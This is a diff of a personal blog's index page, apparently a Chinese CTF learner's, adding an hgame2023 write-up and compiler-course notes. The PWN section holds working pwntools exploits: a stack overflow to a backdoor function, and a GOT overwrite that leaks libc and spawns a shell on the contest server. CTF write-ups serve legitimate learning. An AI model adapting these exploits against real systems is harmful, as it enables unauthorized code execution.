@@ -167,7 +167,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-count">22</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -215,6 +215,694 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://pa1r0t.github.io/2023/01/14/hgame2023/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Pa1r0t_9e">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pa1r0t">
+      <meta itemprop="description" content="welcome to my bolg">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Pa1r0t">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/01/14/hgame2023/" class="post-title-link" itemprop="url">hgame2023</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-01-14 10:09:49 / 修改时间：16:01:30" itemprop="dateCreated datePublished" datetime="2023-01-14T10:09:49+08:00">2023-01-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>复现hgame</p>
+<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="兔兔的车票"><a href="#兔兔的车票" class="headerlink" title="兔兔的车票"></a>兔兔的车票</h3><p>题目：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle, randint, getrandbits</span><br><span class="line"></span><br><span class="line">flagImg = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">width = flagImg.width</span><br><span class="line">height = flagImg.height</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makeSourceImg</span>():</span><br><span class="line">    colors = long_to_bytes(getrandbits(width * height * <span class="number">24</span>))[::-<span class="number">1</span>]</span><br><span class="line">    <span class="comment">#生成图像吧</span></span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="comment">#写像素</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            img.putpixel((j, i), (colors[x], colors[x + <span class="number">1</span>], colors[x + <span class="number">2</span>]))</span><br><span class="line">            x += <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xorImg</span>(<span class="params">keyImg, sourceImg</span>):</span><br><span class="line">    <span class="comment"># 生成图片</span></span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height)) </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))</span><br><span class="line">            img.putpixel((j, i), <span class="built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line">n1 = makeSourceImg()</span><br><span class="line">n2 = makeSourceImg()</span><br><span class="line">n3 = makeSourceImg()</span><br><span class="line">nonce = [n1, n2, n3]    <span class="comment">#三张图片</span></span><br><span class="line"></span><br><span class="line">index = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">16</span>)) <span class="comment">#生成0~16的序列</span></span><br><span class="line">shuffle(index)  <span class="comment"># 打乱序列</span></span><br><span class="line">e=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">这里flag.png已经提前被保存在source文件夹下了，文件名也是picture&#123;xx&#125;.png</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> index:</span><br><span class="line">    im = Image.<span class="built_in">open</span>(<span class="string">f&quot;source/picture<span class="subst">&#123;i&#125;</span>.png&quot;</span>)</span><br><span class="line">    key = nonce[randint(<span class="number">0</span>, <span class="number">2</span>)]</span><br><span class="line">    encImg = xorImg(key, im)</span><br><span class="line">    encImg.save(<span class="string">f&#x27;pics/enc<span class="subst">&#123;e&#125;</span>.png&#x27;</span>)</span><br><span class="line">    e+=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>解法：原先我看着只有enc.png,其他啥都没有，怎么个异或？后来也注意到key只有三个，考虑过重复的情况，但是我发现仅有一个enc.png,还是没法搞出原图，后来看了别人的wp，才知道，只要flag.png^picture.png就行，因为它的picture.png原本的就没啥像素，enc.png大部分还是key的像素，所以找到一张存在flag.png的图片，将key异或掉就行，最终虽然得不到真正得flag.png但模糊程度也不高。这里对16张图片笛卡尔积级别异或就行</p>
+<p>最后解密代码：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle, randint, getrandbits</span><br><span class="line"></span><br><span class="line">flagImg = Image.<span class="built_in">open</span>(<span class="string">f&#x27;pics/enc<span class="subst">&#123;<span class="number">0</span>&#125;</span>.png&#x27;</span>)</span><br><span class="line">width = flagImg.width</span><br><span class="line">height = flagImg.height</span><br><span class="line">flagImg.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xorImg</span>(<span class="params">keyImg, sourceImg</span>):</span><br><span class="line">    <span class="comment"># 生成图片</span></span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height)) </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))</span><br><span class="line">            img.putpixel((j, i), <span class="built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        imi = Image.<span class="built_in">open</span>(<span class="string">f&quot;pics/enc<span class="subst">&#123;i&#125;</span>.png&quot;</span>)</span><br><span class="line">        imj = Image.<span class="built_in">open</span>(<span class="string">f&quot;pics/enc<span class="subst">&#123;j&#125;</span>.png&quot;</span>)</span><br><span class="line">        xorimg = xorImg(imj, imi)</span><br><span class="line">        xorimg.save(<span class="string">f&#x27;source/xor<span class="subst">&#123;i*<span class="number">16</span>+j&#125;</span>.png&#x27;</span>)</span><br><span class="line">        imi.close()</span><br><span class="line">        imj.close()</span><br></pre></td></tr></table></figure>
+
+<p>最后获得模糊的flag图片：</p>
+<p><img src="/./../images/xor246.png" alt="xor246"></p>
+<h3 id="神秘的电话"><a href="#神秘的电话" class="headerlink" title="神秘的电话"></a>神秘的电话</h3><p>题目：</p>
+<p>一个疑似base64编码的txt文件</p>
+<p>一个播放起来是一个摩斯密码的wav文件</p>
+<p>解法：</p>
+<ol>
+<li><p>提取出声音文件的信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">morse2ascii morse.wav</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/image-20230114103532078.png" alt="image-20230114103532078"></p>
+</li>
+<li><p>base64解码：</p>
+</li>
+</ol>
+<p><img src="/./../images/image-20230114103642721.png" alt="image-20230114103642721"></p>
+<p>篱笆一一&gt;栅栏密码；倒着一一&gt;逆序；密匙一一&gt;维吉尼亚密码;北欧神话一一&gt;vidar</p>
+<p>（这里用morse2ascii计算出的数据多了一些下划线，做法是每一处下划线都去掉一个就行）</p>
+<p>最后flag:</p>
+<p><img src="/./../images/image-20230114104040525.png" alt="image-20230114104040525"></p>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h3><p>他妈的，这道死活搞不出来，看了wp才知道是close函数关闭了标准输出通道。需要在来个报错输出，把结果输出过来</p>
+<p>题目没啥好讲的，直接上exp</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;week-1.hgame.lwsec.cn&quot;,31267)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line">back_addr = elf.sym[<span class="string">&#x27;b4ckd0or&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">16</span> + p64(<span class="number">0</span>) + p64(back_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>运用1&gt;&amp;2将结果从报错信息中输出</p>
+<p><img src="/./../images/image-20230114110109416.png" alt="image-20230114110109416"></p>
+<h3 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h3><p>**HINTS:**数组下标的检查好像少了点东西</p>
+<p>下标v0没有检查下界</p>
+<p><img src="/./../images/image-20230114151906912.png" alt="image-20230114151906912"></p>
+<p>seats在bss段，并只有seats写入。无法进行栈操作<img src="/./../images/image-20230114152100537.png" alt="image-20230114152100537"></p>
+<p>思路：运用负下标进行got表覆盖，用got表泄漏libc的地址</p>
+<ol>
+<li>先用vuln函数覆盖exit的地址，防止程序退出，方便下次再次利用</li>
+<li>再用setbuf的plt表进行泄漏got地址，再用指定的libc计算基地址</li>
+<li>用基地址计算system的地址，再用system的地址覆盖puts的地址，puts地址的旁边正好可以存放binsh的地方，连着binsh一起覆盖了</li>
+</ol>
+<p>exp：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># io = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">31940</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">sys_libc = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc_setbuf_addr = libc.sym[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;setbuf:&#x27;</span>,<span class="built_in">hex</span>(libc_setbuf_addr))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">6</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your name&#x27;</span>,p64(vuln_addr))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">8</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your name&#x27;</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name is &#x27;</span>)</span><br><span class="line">res_addr = u64(io.recvuntil(<span class="string">&#x27;Your seat&#x27;</span>).split(<span class="string">b&#x27;\nYour&#x27;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;addr:&#x27;</span>,<span class="built_in">hex</span>(res_addr))</span><br><span class="line">base_addr = res_addr - <span class="number">0x8ba41</span></span><br><span class="line">sys_addr = base_addr + sys_libc</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">9</span>))</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(sys_addr)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your name&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里在覆盖setbuf的地址时会写一个字母，字母所占位置不超过0x1000，因为一个内存页就是0x1000，所以无论基地址如何变，函数在内存页中的偏移地址不变，所以我们写一个字母也只是占用了偏移位置，对计算基地址并不会影响，所以我们查看指定libc中的setbuf（静态），将得到的setbuf的地址的偏移数值和我们泄漏出的偏移数值改成相同，再减去我们泄漏出的总值就能得到base_addr</p>
+<p>下面把d0换成41就行，41就是我们写进去的’A’</p>
+<p><img src="/./../images/image-20230114153844803.png" alt="image-20230114153844803"></p>
+<p>如何这里减去总值：</p>
+<p><img src="/./../images/image-20230114153925669.png" alt="image-20230114153925669"></p>
+<p>binsh的地址正好是下标0x10的整数倍，然后后面就是puts的地址，可以说出题人别有用心了</p>
+<p><img src="/./../images/image-20230114153109502.png" alt="image-20230114153109502"></p>
+<p>（PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。解法：内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的。因此我们可以通过覆盖地址的后几位来可以控制程序的流程）</p>
+
+      
+    </div>
+
+    
+    
+    
+      
+
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://pa1r0t.github.io/2023/01/13/pwn-practice1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Pa1r0t_9e">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pa1r0t">
+      <meta itemprop="description" content="welcome to my bolg">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Pa1r0t">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/01/13/pwn-practice1/" class="post-title-link" itemprop="url">pwn_practice1</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-01-13 11:50:36 / 修改时间：20:33:23" itemprop="dateCreated datePublished" datetime="2023-01-13T11:50:36+08:00">2023-01-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>pwn</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/01/13/pwn-practice1/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      
+
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://pa1r0t.github.io/2023/01/12/%E7%BC%96%E8%AF%91%E5%81%8F2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Pa1r0t_9e">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pa1r0t">
+      <meta itemprop="description" content="welcome to my bolg">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Pa1r0t">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/01/12/%E7%BC%96%E8%AF%91%E5%81%8F2/" class="post-title-link" itemprop="url">编译2</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-01-12 22:07:41 / 修改时间：22:29:00" itemprop="dateCreated datePublished" datetime="2023-01-12T22:07:41+08:00">2023-01-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/re/" itemprop="url" rel="index"><span itemprop="name">re</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>高级语言描述</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/01/12/%E7%BC%96%E8%AF%91%E5%81%8F2/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      
+
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://pa1r0t.github.io/2023/01/09/csapp1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Pa1r0t_9e">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pa1r0t">
+      <meta itemprop="description" content="welcome to my bolg">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Pa1r0t">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/01/09/csapp1/" class="post-title-link" itemprop="url">csapp1</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-01-09 14:30:39" itemprop="dateCreated datePublished" datetime="2023-01-09T14:30:39+08:00">2023-01-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-01-10 09:53:47" itemprop="dateModified" datetime="2023-01-10T09:53:47+08:00">2023-01-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/re/" itemprop="url" rel="index"><span itemprop="name">re</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>学习一下csapp,第一篇</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/01/09/csapp1/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      
+
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://pa1r0t.github.io/2023/01/09/%E7%BC%96%E8%AF%91%E7%AF%871/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Pa1r0t_9e">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pa1r0t">
+      <meta itemprop="description" content="welcome to my bolg">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Pa1r0t">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/01/09/%E7%BC%96%E8%AF%91%E7%AF%871/" class="post-title-link" itemprop="url">编译篇1</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-01-09 10:16:11" itemprop="dateCreated datePublished" datetime="2023-01-09T10:16:11+08:00">2023-01-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-01-12 22:16:44" itemprop="dateModified" datetime="2023-01-12T22:16:44+08:00">2023-01-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/re/" itemprop="url" rel="index"><span itemprop="name">re</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>引论学习</p>
+<h3 id="程序设计语言的转换"><a href="#程序设计语言的转换" class="headerlink" title="程序设计语言的转换"></a>程序设计语言的转换</h3><ul>
+<li>编译：从高级语言到低级语言的过程</li>
+<li>解释：接受高级语言的一条语句输入，进行解释并控制计算机执行，马上获得该语句的执行结果，然后接受下一条语句<ul>
+<li>优点：实现人机交互</li>
+<li>缺点：效率差，每次都要解释，而不像编译一样，只需编译一次，以后只需执行即可</li>
+</ul>
+</li>
+<li>编译的转换过程：<ul>
+<li>两阶段转换：编译一一执行<img src="/./../images/image-20230109130459860.png" alt="image-20230109130459860"></li>
+<li>三个阶段的转换：编译一一汇编一一运行<img src="/./../images/image-20230109131018804.png" alt="image-20230109131018804"></li>
+</ul>
+</li>
+</ul>
+<h3 id="编译程序概述"><a href="#编译程序概述" class="headerlink" title="编译程序概述"></a>编译程序概述</h3><p>自然语言的翻译：</p>
+<ol>
+<li>识别句子中一个个单词</li>
+<li>分析句子的语法结构</li>
+<li>根据句子的含义进行初步翻译</li>
+<li>对译文进行修饰</li>
+<li>写出最后译文</li>
+</ol>
+<p>编译程序的工作：</p>
+<ul>
+<li>词法分析</li>
+<li>语法分析</li>
+<li>语义分析和中间代码的生成</li>
+<li>优化</li>
+<li>目标代码的生成</li>
+</ul>
+<p><img src="/./../images/image-20230109173201830.png" alt="image-20230109173201830"></p>
+<p>词法分析：</p>
+<ul>
+<li>任务：对源程序的字符串进行扫描和分解，识别出一个个单词</li>
+<li>基本字：void,int,float</li>
+<li>标识符：a,b,c,d</li>
+<li>长整数：50</li>
+<li>运算符：+，-，*，&#x3D;</li>
+<li>界限符：{}，；（）</li>
+<li>词法分析依照词法规则，识别出正确的单词，转换成统一规格，备用</li>
+<li>转换：<ul>
+<li>对基本字、运算符、界限符的转换</li>
+<li>标识符的转换</li>
+<li>常数的转换</li>
+<li>转换完成的格式（类号、内码）</li>
+</ul>
+</li>
+<li>描述词法规则的有效工具是正规式和有限自动机</li>
+</ul>
+<p>语法分析：</p>
+<ul>
+<li>任务：词法分析后的单词，根据语言的语法规则，把单词符号组成各类语法单位：子句、语句</li>
+<li>语法规则：规定单词如何组成句，称为文法</li>
+<li>语法规则的表示：<ul>
+<li>BNF:	A::&#x3D;B|C	表示A定义为B或C</li>
+</ul>
+</li>
+<li>语法分析的方法：<strong>推导</strong>和<strong>规约</strong></li>
